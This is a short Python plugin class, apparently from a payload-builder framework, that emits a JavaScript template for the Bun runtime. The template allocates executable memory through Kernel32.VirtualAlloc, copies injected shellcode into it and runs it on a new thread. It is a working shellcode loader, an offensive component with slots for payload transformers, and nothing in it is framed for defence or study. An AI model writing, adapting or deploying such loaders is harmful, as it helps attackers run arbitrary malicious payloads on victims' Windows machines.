class shellcoderunner:
    def __init__(self, arguments):
        pass

    def imports(self) -> list[str]:
        return ['import Kernel32 from "@bun-win32/kernel32";', 
                'import { toArrayBuffer } from "bun:ffi";',
                'import { MemoryAllocationType, MemoryProtection } from "@bun-win32/kernel32";']

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        return ''

    def template(self) -> str:
        return """
    {transformers}

    const address = Kernel32.VirtualAlloc(0, {shellcodeSize}, MemoryAllocationType.MEM_COMMIT | MemoryAllocationType.MEM_RESERVE, MemoryProtection.PAGE_EXECUTE_READWRITE);

    const buffer = new Uint8Array(toArrayBuffer(Number(address), 0, {shellcodeSize}));

    buffer.set(shellcode);

    const hThread = Kernel32.CreateThread(null, 0, address, null, 0, null);

    Kernel32.WaitForSingleObject(hThread, -1);
"""